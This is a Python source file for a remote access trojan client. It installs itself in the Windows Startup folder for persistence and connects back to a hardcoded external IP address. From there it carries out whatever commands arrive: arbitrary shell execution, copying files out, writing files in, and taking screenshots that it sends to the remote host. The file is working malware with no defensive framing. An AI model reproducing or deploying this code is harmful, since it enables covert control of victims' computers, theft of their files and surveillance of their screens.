import socket
import subprocess
import os
import requests
import time
import shutil




def copy_to_startup():
    exe_name = "client.py"

    current_path = os.path.join(os.getcwd(), exe_name)

    startup_path = os.path.join(
        os.environ["APPDATA"],
        r"Microsoft\Windows\Start Menu\Programs\Startup",
        exe_name
    )

    if not os.path.exists(startup_path):
        try:
            shutil.copy2(current_path, startup_path)
            print(f"[+] File copied to Startup: {startup_path}")
        except Exception as e:
            print(f"[-] Failed to copy: {e}")
    else:
        print("[*] File already in Startup.")

copy_to_startup()






GREEN = "\033[92m"
WHITE = "\033[00m"

HOST = "91.107.245.80"
PORT = 8800
PING_URL = "https://www.google.com"


# while True:
#     try:
#         response = requests.get(PING_URL, timeout=5)
#         if response.status_code == 200:
#             break
#     except:
#         pass
#     time.sleep(15)  


with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    while True:
        try:
            s.connect((HOST, PORT))
            break
        except:
            time.sleep(5)

    while True:
        data = s.recv(1024)
        if not data:
            break

        command = data.decode().strip()

        if command == "exit":
            break

        elif command.startswith("cd "):
            path = command[3:].strip()
            try:
                os.chdir(path)
                s.send(f"[+] Changed directory to {GREEN + os.getcwd() + WHITE}\n".encode())
            except Exception as e:
                s.send(f"[-] Error changing directory: {str(e)}\n".encode())

        elif command.startswith("download "):
            filepath = command[9:].strip()
            if os.path.exists(filepath):
                try:
                    with open(filepath, "rb") as f:
                        content = f.read()
                    s.send(str(len(content)).encode())  
                    ack = s.recv(1024)
                    s.sendall(content)
                except Exception as e:
                    s.send(b"ERR_OPEN_FILE")
            else:
                s.send(b"FILE_NOT_FOUND")

        elif command.startswith("upload "):
            filepath = command[7:].strip()
            file_size = s.recv(1024).decode()
            if file_size.startswith("ERR"):
                continue
            file_size = int(file_size)
            s.send(b"READY")
            content = b''
            while len(content) < file_size:
                chunk = s.recv(4096)
                if not chunk:
                    break
                content += chunk
            try:
                with open(filepath, "wb") as f:
                    f.write(content)
                s.send(f"[+] File saved as {filepath}\n".encode())
            except Exception as e:
                s.send(f"[-] Failed to save file: {e}".encode())
        



        elif command == "screenshot":
            try:
                from PIL import ImageGrab
                screenshot = ImageGrab.grab()
                screenshot.save("screenshot.jpg")

                with open("screenshot.jpg", "rb") as f:
                    image_data = f.read()

                s.send(str(len(image_data)).encode())
                ack = s.recv(1024)
                s.sendall(image_data)
                os.remove("screenshot.jpg")

            except Exception as e:
                s.send(f"[-] Screenshot failed: {str(e)}".encode())




        else:
            try:
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=60,
                    cwd=os.getcwd()
                )
                output = result.stdout + result.stderr
                if not output.strip():
                    s.send("[+] Command executed but no output.\n".encode())
                else:
                    s.send(output.encode())
            except Exception as e:
                s.send(f"[-] Command failed: {str(e)}\n".encode())